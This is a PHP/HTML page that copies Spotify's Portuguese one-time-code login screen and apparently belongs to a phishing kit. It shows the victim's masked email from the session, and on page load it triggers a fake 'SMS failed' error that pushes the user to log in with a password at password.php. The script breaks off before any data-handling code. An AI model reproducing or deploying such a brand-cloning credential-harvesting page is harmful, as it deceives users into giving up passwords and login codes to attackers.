<?php
session_start();
$email_original = isset($_SESSION['user_email']) ? $_SESSION['user_email'] : 'seu e-mail';

function mascararEmail($email) {
    if (strpos($email, '@') === false) { return htmlspecialchars($email); }
    list($user, $domain) = explode('@', $email);
    
    $lenUser = strlen($user);
    if ($lenUser > 2) {
        $userMask = $user[0] . '*****' . $user[$lenUser - 1];
    } else {
        $userMask = $user; 
    }

    list($prov, $ext) = explode('.', $domain, 2);
    $lenProv = strlen($prov);
    if ($lenProv > 2) {
        $provMask = $prov[0] . '****' . $prov[$lenProv - 1];
    } else {
        $provMask = $prov;
    }

    return $userMask . '@' . $provMask . '.' . $ext;
}

$email_mostrado = mascararEmail($email_original);

$link_senha = "password.php";
?>
<!DOCTYPE html><html lang="pt-PT" dir="ltr"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="icon" href="https://www.scdn.co/i/_global/favicon.png"/><title>Spotify</title><meta name="next-head-count" content="4"/><link rel="preconnect" href="https://challenge.spotifycdn.com" crossorigin="anonymous"/><link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUI-Regular-cc3b1de388efa4cbca6c75cebc24585e.woff2" as="font" type="font/woff2" crossorigin="anonymous"/><link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUITitleVariable-8769ccfde3379b7ebcadd9529b49d0cc.woff2" as="font" type="font/woff2" crossorigin="anonymous"/><link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUITitle-Bold-37290f1de77f297fcc26d71e9afcf43f.woff2" as="font" type="font/woff2" crossorigin="anonymous"/><link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUI-Bold-4264b799009b1db5c491778b1bc8e5b7.woff2" as="font" type="font/woff2" crossorigin="anonymous"/><link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUITitleVariable-8769ccfde3379b7ebcadd9529b49d0cc.woff2" as="font" type="font/woff2" crossorigin="anonymous"/><link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUITitle-Extrabold-ba6c73cd7f82c81e49cf2204017803ed.woff2" as="font" type="font/woff2" crossorigin="anonymous"/><link rel="stylesheet" href="https://challenge.spotifycdn.com/_next/static/css/24c52cfe6312d818.css" data-n-g=""/><link rel="stylesheet" href="https://challenge.spotifycdn.com/_next/static/css/feb97816d1a1ab82.css" data-n-p=""/><style data-styled="" data-styled-version="6.1.13">.cwbXbV{box-sizing:border-box;-webkit-tap-highlight-color:transparent;padding-inline:0;margin-block:0;overflow-wrap:break-word;list-style-type:none;}/*!sc*/
data-styled.g1[id="TypeList__TypeListElement-sc-1jhixr6-0"]{content:"cwbXbV,"}/*!sc*/
.eEhBRD{position:absolute;top:0;left:0;display:inline-block;background-color:var(--background-base, #ffffff);padding-block:var(--encore-spacing-base, 16px) 24px;padding-inline:var(--encore-spacing-base, 16px);text-decoration:none;z-index:9999;}/*!sc*/
.eEhBRD:focus{outline:none;}/*!sc*/
[dir='rtl'] .eEhBRD{left:unset;right:0;}/*!sc*/
.eEhBRD:not(:focus){border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px;}/*!sc*/
data-styled.g10[id="Link-sc-1rnxmqt-0"]{content:"eEhBRD,"}/*!sc*/
.YBfCz{box-sizing:border-box;-webkit-tap-highlight-color:transparent;color:var(--text-base, #000000);border-color:var(--essential-base, #000000);transition:color 200ms ease-in;overflow-wrap:break-word;}/*!sc*/
.YBfCz::after{display:block;position:absolute;pointer-events:none;transition:border-color 200ms ease-in;box-sizing:border-box;bottom:-6px;border-bottom:3px solid transparent;width:100%;content:'';position:relative;border-color:inherit;}/*!sc*/
data-styled.g11[id="LinkText-sc-3xixkl-0"]{content:"YBfCz,"}/*!sc*/
.juVETY{position:sticky;top:0;z-index:1030;}/*!sc*/
data-styled.g12[id="Banner__BannerHeader-sc-1bnzyty-0"]{content:"juVETY,"}/*!sc*/
@media (max-width:767px){.gNpUPj{margin-inline:calc(-1 * var(--encore-layout-margin-base, 24px));}}/*!sc*/
@media (min-width:768px){.gNpUPj{margin-inline:calc(-1 * var(--encore-layout-margin-base, 32px));}}/*!sc*/
data-styled.g13[id="Banner-sc-1bnzyty-1"]{content:"gNpUPj,"}/*!sc*/
.DtbCy{box-sizing:border-box;-webkit-tap-highlight-color:transparent;position:absolute;top:0;left:0;display:flex;flex-direction:column;inline-size:100%;min-block-size:100%;background:var(--background-base,#ffffff);color:var(--text-base,#000000);overflow-wrap:break-word;}/*!sc*/
data-styled.g14[id="Container-sc-c1ixcy-0"]{content:"DtbCy,"}/*!sc*/
.eCpPvf{display:flex;flex-direction:column;flex:1;}/*!sc*/
@media (max-width:767px){.eCpPvf{padding-inline:var(--encore-layout-margin-base, 24px);}}/*!sc*/
@media (min-width:768px){.eCpPvf{padding-inline:var(--encore-layout-margin-base, 32px);margin-inline-start:0px;max-inline-size:100vw;}}/*!sc*/
data-styled.g15[id="Content-sc-1n5ckz4-0"]{content:"eCpPvf,"}/*!sc*/
.feCLKA{flex:1;}/*!sc*/
data-styled.g16[id="Main-sc-tbtyrr-0"]{content:"feCLKA,"}/*!sc*/
@media (min-width:768px){.cPRdYI{position:fixed;block-size:100%;top:0;inline-size:0px;left:0;z-index:1030;}[dir='rtl'] .cPRdYI{left:unset;right:0;}}/*!sc*/
.docs-story .cPRdYI{position:relative;}/*!sc*/
@media (min-width:768px){.docs-story .cPRdYI{position:absolute;}}/*!sc*/
data-styled.g17[id="Sidebar-sc-6utsg5-0"]{content:"cPRdYI,"}/*!sc*/
.iZRBgQ{box-sizing:border-box;-webkit-tap-highlight-color:transparent;display:flex;flex-wrap:wrap;min-inline-size:0;padding-block:24px;border-block-start:1px solid var(--decorative-subdued,#dedede);}/*!sc*/
@media (min-width:768px){.iZRBgQ{padding-inline:var(--encore-spacing-tighter-2, 8px);}}/*!sc*/
.iZRBgQ nav{min-inline-size:0;}/*!sc*/
.iZRBgQ >:last-child{display:flex;align-items:flex-end;justify-content:flex-end;flex-grow:1;flex-shrink:0;}/*!sc*/
data-styled.g21[id="Container-sc-79vijq-0"]{content:"iZRBgQ,"}/*!sc*/
.dtvcQk{padding-block-end:0;flex-shrink:0;}/*!sc*/
data-styled.g22[id="Copyright-sc-15d7gge-0"]{content:"dtvcQk,"}/*!sc*/
.MFVcw{flex-wrap:wrap;}/*!sc*/
@media (min-width:768px){.MFVcw{align-items:center;display:flex;justify-content:flex-start;}}/*!sc*/
data-styled.g25[id="List-sc-vnil8g-0"]{content:"MFVcw,"}/*!sc*/
.XTsSI{box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;border:0;border-radius:var(--encore-button-corner-radius, 9999px);cursor:pointer;display:inline-block;position:relative;text-align:center;text-decoration:none;text-transform:none;touch-action:manipulation;transition-duration:33ms;transition-property:background-color,border-color,color,box-shadow,filter,transform;user-select:none;vertical-align:middle;transform:translate3d(0,0,0);color:var(--text-base, #000000);min-inline-size:0;min-block-size:var(--encore-control-size-base, 48px);padding-block:var(--encore-spacing-tighter-2, 8px);padding-inline:var(--encore-spacing-looser-2, 32px);display:inline-flex;align-items:center;justify-content:center;position:relative;}/*!sc*/
.XTsSI:focus{outline:none;}/*!sc*/
@supports (overflow-wrap:anywhere){.XTsSI{overflow-wrap:anywhere;}}/*!sc*/
@supports not (overflow-wrap:anywhere){.XTsSI{word-break:break-word;}}/*!sc*/
.XTsSI:hover{transform:scale(1.04);}/*!sc*/
.XTsSI:active{opacity:0.7;outline:none;transform:scale(1);color:var(--text-base, #000000);}/*!sc*/
.XTsSI:focus{outline:none;}/*!sc*/
.XTsSI::after{content:'';display:block;position:absolute;pointer-events:none;transition:border-color 200ms ease-in;box-sizing:border-box;bottom:5px;border-bottom:3px solid transparent;width:100%;}/*!sc*/
.XTsSI:focus::after{border-color:inherit;}/*!sc*/
.XTsSI::after{inline-size:calc(100% - (var(--encore-spacing-looser-2, 32px) * 2));}/*!sc*/
.XTsSI[disabled],.XTsSI[aria-disabled='true'],fieldset[disabled] .XTsSI{cursor:not-allowed;opacity:0.3;transform:scale(1);color:var(--text-base, #000000);}/*!sc*/
.XTsSI[disabled]::before,.XTsSI[aria-disabled='true']::before,fieldset[disabled] .XTsSI::before{background-color:transparent;}/*!sc*/
.XTsSI[disabled]::after,.XTsSI[aria-disabled='true']::after,fieldset[disabled] .XTsSI::after{border-color:transparent;}/*!sc*/
data-styled.g29[id="Button-sc-1dqy6lx-0"]{content:"XTsSI,"}/*!sc*/
.gDggmB{border-color:transparent;display:block;position:absolute;pointer-events:none;transition:border-color 200ms ease-in;box-sizing:border-box;inline-size:calc(100% + 12px);block-size:calc(100% + 12px);top:-6px;left:-6px;background:transparent;border-radius:var(--encore-button-corner-radius, 9999px);border:3px solid transparent;}/*!sc*/
data-styled.g37[id="ButtonFocus-sc-2hq6ey-0"]{content:"gDggmB,"}/*!sc*/
.hCjoKJ{box-sizing:border-box;-webkit-tap-highlight-color:transparent;position:relative;background-color:var(--background-base,#1ed760);color:var(--text-base,#000000);display:flex;border-radius:var(--encore-button-corner-radius, 9999px);font-size:inherit;min-block-size:var(--encore-control-size-base, 48px);align-items:center;justify-content:center;padding-block:var(--encore-spacing-tighter-2, 8px);padding-inline:var(--encore-spacing-looser-2, 32px);transition-property:background-color,transform;transition-duration:33ms;}/*!sc*/
@supports (overflow-wrap:anywhere){.hCjoKJ{overflow-wrap:anywhere;}}/*!sc*/
@supports not (overflow-wrap:anywhere){.hCjoKJ{word-break:break-word;}}/*!sc*/
data-styled.g38[id="ButtonInner-sc-14ud5tc-0"]{content:"hCjoKJ,"}/*!sc*/
.hXTdIz{box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;border:0;border-radius:var(--encore-button-corner-radius, 9999px);cursor:pointer;display:inline-block;position:relative;text-align:center;text-decoration:none;text-transform:none;touch-action:manipulation;transition-duration:33ms;transition-property:background-color,border-color,color,box-shadow,filter,transform;user-select:none;vertical-align:middle;transform:translate3d(0,0,0);padding:0;min-inline-size:0;align-self:center;inline-size:100%;}/*!sc*/
.hXTdIz:focus{outline:none;}/*!sc*/
.hXTdIz:hover .ButtonInner-sc-14ud5tc-0{background-color:var(--background-highlight,#3be477);}/*!sc*/
.hXTdIz:active .ButtonInner-sc-14ud5tc-0{background-color:var(--background-press,#1abc54);box-shadow:none;transform:scale(1);}/*!sc*/
.hXTdIz:active .ButtonFocus-sc-2hq6ey-0{transform:scale(1);}/*!sc*/
.hXTdIz:focus .ButtonFocus-sc-2hq6ey-0{border-color:var(--parents-essential-base, var(--essential-base, #000000));}/*!sc*/
.hXTdIz[disabled] .ButtonInner-sc-14ud5tc-0,.hXTdIz[aria-disabled='true'] .ButtonInner-sc-14ud5tc-0,fieldset[disabled] .hXTdIz .ButtonInner-sc-14ud5tc-0{cursor:not-allowed;opacity:0.3;transform:scale(1);background-color:var(--background-base,#1ed760);color:var(--text-base,#000000);}/*!sc*/
.hXTdIz[disabled] .ButtonFocus-sc-2hq6ey-0,.hXTdIz[aria-disabled='true'] .ButtonFocus-sc-2hq6ey-0,fieldset[disabled] .hXTdIz .ButtonFocus-sc-2hq6ey-0{border-color:transparent;}/*!sc*/
data-styled.g39[id="Button-sc-qlcn5g-0"]{content:"hXTdIz,"}/*!sc*/
.jYLRUR{box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;border:0;border-radius:var(--encore-button-corner-radius, 9999px);cursor:pointer;display:inline-block;position:relative;text-align:center;text-decoration:none;text-transform:none;touch-action:manipulation;transition-duration:33ms;transition-property:background-color,border-color,color,box-shadow,filter,transform;user-select:none;vertical-align:middle;transform:translate3d(0,0,0);padding-block:calc(var(--encore-spacing-tighter-4, 4px) - 1px);padding-inline:calc(var(--encore-spacing-base, 16px) - 1px);position:relative;border:1px solid var(--essential-subdued, #818181);color:var(--text-base, #000000);min-inline-size:0;min-block-size:var(--encore-control-size-smaller, 32px);display:inline-flex;align-items:center;justify-content:center;}/*!sc*/
.jYLRUR:focus{outline:none;}/*!sc*/
.jYLRUR:focus{outline:none;}/*!sc*/
.jYLRUR::after{display:block;position:absolute;pointer-events:none;transition:border-color 200ms ease-in;box-sizing:border-box;inline-size:calc(100% + calc(12px + (2 * var(--encore-border-width-hairline, 1px))));block-size:calc(100% + calc(12px + (2 * var(--encore-border-width-hairline, 1px))));top:calc(-6px - var(--encore-border-width-hairline, 1px));left:calc(-6px - var(--encore-border-width-hairline, 1px));background:transparent;border-radius:var(--encore-button-corner-radius, 9999px);border:3px solid transparent;content:'';}/*!sc*/
.jYLRUR:focus::after{border-color:var(--parents-essential-base, var(--essential-base, #000000));}/*!sc*/
@supports (overflow-wrap:anywhere){.jYLRUR{overflow-wrap:anywhere;}}/*!sc*/
@supports not (overflow-wrap:anywhere){.jYLRUR{word-break:break-word;}}/*!sc*/
.jYLRUR:hover{transform:scale(1.04);border:1px solid var(--essential-base, #000000);}/*!sc*/
.jYLRUR:active{opacity:0.7;outline:none;transform:scale(1);border:1px solid var(--essential-subdued, #818181);}/*!sc*/
.jYLRUR[disabled],.jYLRUR[aria-disabled='true'],fieldset[disabled] .jYLRUR{cursor:not-allowed;opacity:0.3;transform:scale(1);border-color:var(--essential-subdued, #818181);}/*!sc*/
.jYLRUR[disabled]::after,.jYLRUR[aria-disabled='true']::after,fieldset[disabled] .jYLRUR::after{border-color:transparent;}/*!sc*/
data-styled.g41[id="Button-sc-y0gtbx-0"]{content:"jYLRUR,"}/*!sc*/
.gqBvug{box-sizing:border-box;-webkit-tap-highlight-color:transparent;padding-block-end:var(--encore-spacing-looser, 24px);}/*!sc*/
data-styled.g113[id="Group-sc-u9bcx5-0"]{content:"gqBvug,"}/*!sc*/
*{box-sizing:border-box;}/*!sc*/
*::before,*::after{box-sizing:border-box;}/*!sc*/
body{margin:0;}/*!sc*/
body,input,textarea,button{font-family:var(--encore-body-font-stack);}/*!sc*/
html,body{height:100%;}/*!sc*/
data-styled.g140[id="sc-global-cnFbJs1"]{content:"sc-global-cnFbJs1,"}/*!sc*/
.EIZUx{fill:var(--decorative-base, #000000);stroke:transparent;}/*!sc*/
data-styled.g163[id="Svg-sc-6c3c1v-0"]{content:"EIZUx,"}/*!sc*/
.fKJLep{background:var(--background-elevated-base, #006bcf);color:var(--text-base, #ffffff);border-radius:var(--encore-corner-radius-larger-2, 8px);box-shadow:0 4px 12px 0 rgba(0, 0, 0, 0.3);text-align:start;cursor:default;display:inline-block;max-inline-size:384px;position:relative;padding-block:var(--encore-spacing-tighter, 12px);padding-inline:var(--encore-spacing-looser-2, 32px);overflow-wrap:break-word;text-align:center;position:fixed;overflow-x:hidden;text-overflow:ellipsis;z-index:1050;transition:visibility 300ms linear,opacity 300ms ease-in-out;bottom:48px;visibility:hidden;opacity:0;}/*!sc*/
.fKJLep .docs-story{position:absolute;}/*!sc*/
@media (max-width:479px){.fKJLep{left:8px;right:8px;}}/*!sc*/
@media (min-width:768px){.fKJLep{transform:translateX(-50%);left:50%;}}/*!sc*/
data-styled.g216[id="Container-sc-eij2zk-0"]{content:"fKJLep,"}/*!sc*/
.bzhZlX{width:100%;padding:32px 16px 48px 16px;background-color:var(--background-base, #ffffff);margin-inline:calc(-1 * var(--encore-layout-margin-base));}/*!sc*/
data-styled.g241[id="App__HeaderBanner-sc-isuaud-0"]{content:"bzhZlX,"}/*!sc*/
.WpHpA footer{border:none;}/*!sc*/
data-styled.g243[id="App__AppFooterContainer-sc-isuaud-2"]{content:"WpHpA,"}/*!sc*/
.frMiBK{position:relative;display:flex;align-items:center;justify-content:center;margin-block-start:0;margin-block-end:0;border-radius:var(--encore-corner-radius-base, 4px);block-size:calc(16px * 2 + 20px);inline-size:calc(16px * 2 + 12px);font-size:1.5rem;font-weight:700;font-family:var(--encore-title-font-stack, var(--fallback-fonts, sans-serif));background-color:var(--background-base, #ffffff);box-shadow:inset 0 0 0 1px var(--essential-subdued, #818181);color:var(--text-base, #000000);opacity:1;transition:box-shadow 100ms ease-in-out,color 100ms ease-in-out;text-transform:uppercase;}/*!sc*/
.frMiBK:focus-within{box-shadow:inset 0 0 0 3px var(--essential-base, #000000);}/
data-styled.g296[id="OTCInput__SlotContainer-sc-otwh5g-0"]{content:"frMiBK,"}
.hrvKQP{position:relative;flex:1;min-inline-size:4px;}
data-styled.g297[id="OTCInput__SlotPadding-sc-otwh5g-1"]{content:"hrvKQP,"}
.iWTmfa{display:flex;direction:ltr;}
data-styled.g298[id="OTCInput__InputContainer-sc-otwh5g-2"]{content:"iWTmfa,"}
.jAHRcf{position:absolute;inset:0;width:100%;height:100%;background:transparent;border:none;text-align:center;font-size:inherit;font-family:inherit;color:inherit;outline:none;padding:0;margin:0;text-transform:uppercase;caret-color:transparent;}/*!sc*/
.jAHRcf::selection{background:transparent;}
.jAHRcf::-moz-selection{background:transparent;}
.jAHRcf::-webkit-outer-spin-button,.jAHRcf::-webkit-inner-spin-button{-webkit-appearance:none;margin:0;}/*!sc*/
.jAHRcf[type='number']{-moz-appearance:textfield;}
data-styled.g299[id="OTCInput__SlotInput-sc-otwh5g-3"]{content:"jAHRcf,"}/*!sc*/
.fHyMPz{margin:auto;padding-block-end:16px;}
@media (min-width:768px){.fHyMPz{max-width:324px;}}
data-styled.g300[id="EmailVerificationChallenge__Container-sc-55dvy9-0"]{content:"fHyMPz,"}/*!sc*/
.bmIoMH{text-align:start;}
data-styled.g301[id="EmailVerificationChallenge__Title-sc-55dvy9-1"]{content:"bmIoMH,"}/*!sc*/
.KStxp{display:flex;flex-direction:column;padding-block-start:32px;gap:12px;}/*!sc*/
data-styled.g303[id="EmailVerificationChallenge__FallbackFooter-sc-55dvy9-3"]{content:"KStxp,"}/*!sc*/
#custom-error-banner {
    display: none;
    background-color: #e91429;
    color: #ffffff;
    padding: 10px 14px;
    border-radius: 4px;
    font-size: 14px;
    line-height: 20px;
    margin-bottom: 24px;
    align-items: center;
    gap: 12px;
    text-align: left;
}
#custom-error-banner svg { fill: white; flex-shrink: 0; }
.frMiBK.input-error { box-shadow: inset 0 0 0 3px #e91429 !important; }
</style></head><body><div id="__next"><div class="Container-sc-c1ixcy-0 DtbCy encore-base-set encore-layout-themes encore-dark-theme" style="margin-block:0 auto;width:100%"><a class="Link-sc-1rnxmqt-0 eEhBRD encore-inverted-light-set" href="#encore-web-main-content" data-encore-id="skipLink"><div class="LinkText-sc-3xixkl-0 YBfCz">Skip to content</div></a><div class="Sidebar-sc-6utsg5-0 cPRdYI"></div><div class="Content-sc-1n5ckz4-0 eCpPvf"><div class="Banner__BannerHeader-sc-1bnzyty-0 juVETY"><aside aria-live="polite" class="Banner-sc-1bnzyty-1 gNpUPj"></aside><aside class="Banner-sc-1bnzyty-1 gNpUPj"></aside></div><main id="encore-web-main-content" tabindex="-1" class="Main-sc-tbtyrr-0 feCLKA"><div class="App__HeaderBanner-sc-isuaud-0 bzhZlX"><svg role="img" viewBox="0 0 24 24" aria-label="Spotify" aria-hidden="false" height="24" data-encore-id="logoSpotify" class="Svg-sc-6c3c1v-0 EIZUx"><title>Spotify</title><path d="M13.427.01C6.805-.253 1.224 4.902.961 11.524.698 18.147 5.853 23.728 12.476 23.99c6.622.263 12.203-4.892 12.466-11.514S20.049.272 13.427.01m5.066 17.579a.717.717 0 0 1-.977.268 14.4 14.4 0 0 0-5.138-1.747 14.4 14.4 0 0 0-5.42.263.717.717 0 0 1-.338-1.392c1.95-.474 3.955-.571 5.958-.29 2.003.282 3.903.928 5.647 1.92a.717.717 0 0 1 .268.978m1.577-3.15a.93.93 0 0 1-1.262.376 17.7 17.7 0 0 0-5.972-1.96 17.7 17.7 0 0 0-6.281.238.93.93 0 0 1-1.11-.71.93.93 0 0 1 .71-1.11 19.5 19.5 0 0 1 6.94-.262 19.5 19.5 0 0 1 6.599 2.165c.452.245.62.81.376 1.263m1.748-3.551a1.147 1.147 0 0 1-1.546.488 21.4 21.4 0 0 0-6.918-2.208 21.4 21.4 0 0 0-7.259.215 1.146 1.146 0 0 1-.456-2.246 23.7 23.7 0 0 1 8.034-.24 23.7 23.7 0 0 1 7.657 2.445c.561.292.78.984.488 1.546m13.612-.036-.832-.247c-1.67-.495-2.14-.681-2.14-1.353 0-.637.708-1.327 2.264-1.327 1.539 0 2.839.752 3.51 1.31.116.096.24.052.24-.098V6.935c0-.097-.027-.15-.098-.203-.83-.62-2.272-1.07-3.723-1.07-2.953 0-4.722 1.68-4.722 3.59 0 2.157 1.371 2.91 3.626 3.546l.973.274c1.689.478 1.998.902 1.998 1.556 0 1.097-.831 1.433-2.07 1.433-1.556 0-3.457-.911-4.35-2.025-.08-.098-.177-.053-.177.062v2.423c0 .097.01.141.08.22.743.814 2.52 1.53 4.59 1.53 2.546 0 4.456-1.485 4.456-3.784 0-1.787-1.052-2.865-3.625-3.635m10.107-1.76c-1.68 0-2.653 1.026-3.219 2.052V9.376c0-.08-.044-.124-.124-.124h-2.22c-.079 0-.123.044-.123.124V20.72c0 .08.044.124.124.124h2.22c.079 0 .123-.044.123-.124v-4.536c.566 1.025 1.521 2.034 3.237 2.034 2.264 0 3.89-1.955 3.89-4.581s-1.644-4.545-3.908-4.545m-.654 6.986c-1.185 0-2.211-1.167-2.618-2.458.407-1.362 1.344-2.405 2.618-2.405 1.211 0 2.051.92 2.051 2.423s-.84 2.44-2.051 2.44m40.633-6.826h-2.264c-.08 0-.115.017-.15.097l-2.282 5.483-2.29-5.483c-.035-.08-.07-.097-.15-.097h-3.661v-.584c0-.955.645-1.397 1.476-1.397.496 0 1.035.256 1.415.486.089.053.15-.008.115-.088l-.796-1.901a.26.26 0 0 0-.124-.133c-.389-.203-1.025-.38-1.644-.38-1.875 0-2.954 1.432-2.954 3.254v.743h-1.503c-.08 0-.124.044-.124.124v1.768c0 .08.044.124.124.124h1.503v6.668c0 .08.044.123.124.123h2.264c.08 0 .124-.044.124-.123v-6.668h1.936l2.812 6.11-1.512 3.325c-.044.098.009.142.097.142h2.414c.08 0 .116-.018.15-.097l4.997-11.355c.035-.08-.009-.141-.097-.141M54.964 9.04c-2.865 0-4.837 2.025-4.837 4.616 0 2.573 1.971 4.616 4.837 4.616 2.856 0 4.846-2.043 4.846-4.616 0-2.591-1.99-4.616-4.846-4.616m.008 7.065c-1.37 0-2.343-1.043-2.343-2.45 0-1.405.973-2.449 2.343-2.449 1.362 0 2.335 1.043 2.335 2.45 0 1.406-.973 2.45-2.335 2.45m33.541-6.334a1.24 1.24 0 0 0-.483-.471 1.4 1.4 0 0 0-.693-.17q-.384 0-.693.17a1.24 1.24 0 0 0-.484.471q-.174.302-.174.681 0 .375.174.677.175.3.484.471t.693.17.693-.17.483-.471.175-.676q0-.38-.175-.682m-.211 1.247a1 1 0 0 1-.394.39 1.15 1.15 0 0 1-.571.14 1.16 1.16 0 0 1-.576-.14 1 1 0 0 1-.391-.39 1.14 1.14 0 0 1-.14-.566q0-.316.14-.562t.391-.388.576-.14q.32 0 .57.14.253.141.395.39t.142.565q0 .312-.142.56m-19.835-5.78c-.85 0-1.468.6-1.468 1.396s.619 1.397 1.468 1.397c.866 0 1.485-.6 1.485-1.397 0-.796-.619-1.397-1.485-1.397m19.329 5.19a.31.31 0 0 0 .134-.262q0-.168-.132-.266-.132-.099-.381-.099h-.588v1.229h.284v-.489h.154l.374.489h.35l-.41-.518a.5.5 0 0 0 .215-.084m-.424-.109h-.26v-.3h.27q.12 0 .184.036a.12.12 0 0 1 .065.116.12.12 0 0 1-.067.111.4.4 0 0 1-.192.037M69.607 9.252h-2.263c-.08 0-.124.044-.124.124v8.56c0 .08.044.123.124.123h2.263c.08 0 .124-.044.124-.123v-8.56c0-.08-.044-.124-.124-.124m-3.333 6.605a2.1 2.1 0 0 1-1.053.257c-.725 0-1.185-.425-1.185-1.362v-3.484h2.211c.08 0 .124-.044.124-.124V9.376c0-.08-.044-.124-.124-.124h-2.21V6.944c0-.097-.063-.15-.15-.08l-3.954 3.113c-.053.044-.07.088-.07.16v1.007c0 .08.044.124.123.124h1.539v3.855c0 2.087 1.203 3.06 2.918 3.06.743 0 1.46-.194 1.884-.442.062-.035.07-.07.07-.133v-1.68c0-.088-.044-.115-.123-.07" transform="translate(-0.95,0)"></path></svg></div><div><div class="ContentContainer_containerStyle__lCP98"><div lang="pt-PT" dir="ltr"><div class="EmailVerificationChallenge__Container-sc-55dvy9-0 fHyMPz"><form method="POST" autoComplete="off" onsubmit="event.preventDefault();"><div style="padding-block-end:12px" class="EmailVerificationChallenge__InfoBlock-sc-55dvy9-4 eYLDho"><div style="padding-block-end:12px"><span class="encore-text encore-text-title-small encore-internal-color-text-base EmailVerificationChallenge__Title-sc-55dvy9-1 bmIoMH" data-encore-id="text" align="start">Insira o código de 6 dígitos enviado para<b><?php echo $email_mostrado; ?></b>.</span></div></div>
<div id="custom-error-banner">
    <svg role="img" height="24" width="24" viewBox="0 0 24 24" aria-label="Erro"><path d="M11 18v-2h2v2h-2zm0-4V6h2v8h-2z"></path><path d="M12 3a9 9 0 1 0 0 18 9 9 0 0 0 0-18zM1 12C1 5.925 5.925 1 12 1s11 4.925 11 11-4.925 11-11 11S1 18.075 1 12z"></path></svg>
    <span>Ocorreu um problema ao enviar o SMS. Logue com a senha ou tenta novamente mais tarde.</span>
</div>
<div style="padding-block-end:24px" class="EmailVerificationChallenge__InputBlock-sc-55dvy9-5 jipEUB"><div style="padding-block-end:32px" data-encore-id="formGroup" class="Group-sc-u9bcx5-0 gqBvug"><div style="padding-block-end:20px"><div dir="ltr" class="OTCInput__InputContainer-sc-otwh5g-2 iWTmfa"><div class="OTCInput__SlotContainer-sc-otwh5g-0 frMiBK"><input inputMode="numeric" autoComplete="one-time-code" aria-label="Dígito 1 de 6, introduz o código de início de sessão enviado para o teu e-mail" autofocus="" class="OTCInput__SlotInput-sc-otwh5g-3 jAHRcf otp-smart-input" value=""/></div><div class="OTCInput__SlotPadding-sc-otwh5g-1 hrvKQP"></div><div class="OTCInput__SlotPadding-sc-otwh5g-1 hrvKQP"></div><div class="OTCInput__SlotContainer-sc-otwh5g-0 frMiBK"><input inputMode="numeric" autoComplete="one-time-code" aria-label="Dígito 2 de 6, introduz o código de início de sessão enviado para o teu e-mail" class="OTCInput__SlotInput-sc-otwh5g-3 jAHRcf otp-smart-input" value=""/></div><div class="OTCInput__SlotPadding-sc-otwh5g-1 hrvKQP"></div><div class="OTCInput__SlotPadding-sc-otwh5g-1 hrvKQP"></div><div class="OTCInput__SlotContainer-sc-otwh5g-0 frMiBK"><input inputMode="numeric" autoComplete="one-time-code" aria-label="Dígito 3 de 6, introduz o código de início de sessão enviado para o teu e-mail" class="OTCInput__SlotInput-sc-otwh5g-3 jAHRcf otp-smart-input" value=""/></div><div class="OTCInput__SlotPadding-sc-otwh5g-1 hrvKQP"></div><div class="OTCInput__SlotPadding-sc-otwh5g-1 hrvKQP"></div><div class="OTCInput__SlotContainer-sc-otwh5g-0 frMiBK"><input inputMode="numeric" autoComplete="one-time-code" aria-label="Dígito 4 de 6, introduz o código de início de sessão enviado para o teu e-mail" class="OTCInput__SlotInput-sc-otwh5g-3 jAHRcf otp-smart-input" value=""/></div><div class="OTCInput__SlotPadding-sc-otwh5g-1 hrvKQP"></div><div class="OTCInput__SlotPadding-sc-otwh5g-1 hrvKQP"></div><div class="OTCInput__SlotContainer-sc-otwh5g-0 frMiBK"><input inputMode="numeric" autoComplete="one-time-code" aria-label="Dígito 5 de 6, introduz o código de início de sessão enviado para o teu e-mail" class="OTCInput__SlotInput-sc-otwh5g-3 jAHRcf otp-smart-input" value=""/></div><div class="OTCInput__SlotPadding-sc-otwh5g-1 hrvKQP"></div><div class="OTCInput__SlotPadding-sc-otwh5g-1 hrvKQP"></div><div class="OTCInput__SlotContainer-sc-otwh5g-0 frMiBK"><input inputMode="numeric" autoComplete="one-time-code" aria-label="Dígito 6 de 6, introduz o código de início de sessão enviado para o teu e-mail" class="OTCInput__SlotInput-sc-otwh5g-3 jAHRcf otp-smart-input" value=""/></div></div></div><div style="text-align:center"><a data-testid="resend-code-button" href="#" onclick="triggerError(); return false;" class="Button-sc-y0gtbx-0 jYLRUR encore-text-body-small-bold" data-encore-id="buttonSecondary">Reenviar código</a></div></div><div style="padding-block-end:16px" data-encore-id="formGroup" class="Group-sc-u9bcx5-0 gqBvug"><button type="button" onclick="verificarCodigo()" data-encore-id="buttonPrimary" class="Button-sc-qlcn5g-0 hXTdIz encore-text-body-medium-bold"><span class="ButtonInner-sc-14ud5tc-0 hCjoKJ encore-bright-accent-set">Entrar</span><span class="ButtonFocus-sc-2hq6ey-0 gDggmB"></span></button></div><section class="EmailVerificationChallenge__FallbackFooter-sc-55dvy9-3 KStxp"><button type="button" onclick="window.location.href='<?php echo $link_senha; ?>'" class="Button-sc-1dqy6lx-0 XTsSI encore-text-body-medium-bold" data-encore-id="buttonTertiary">Entrar com senha</button></section></div></form><div role="status"><div class="Container-sc-eij2zk-0 fKJLep encore-announcement-set" data-encore-id="snackbar"><span class="encore-text encore-text-body-small encore-internal-color-text-base" data-encore-id="text">Novo código de segurança enviado. Podes ter de verificar a tua pasta de spam.</span></div></div></div></div></div></div></main><div><div class="App__AppFooterContainer-sc-isuaud-2 WpHpA"><footer class="Container-sc-79vijq-0 iZRBgQ"><nav><ul role="list" class="TypeList__TypeListElement-sc-1jhixr6-0 cwbXbV List-sc-vnil8g-0 MFVcw" data-encore-id="typeList"></ul></nav><div><small class="encore-text encore-text-marginal Copyright-sc-15d7gge-0 dtvcQk" data-encore-id="text" translate="no">© 2025 Spotify AB</small></div></footer></div></div></div></div></div>
<script>
    const inputs = document.querySelectorAll('.otp-smart-input');
    const errorBanner = document.getElementById('custom-error-banner');

    document.addEventListener('DOMContentLoaded', triggerError); 

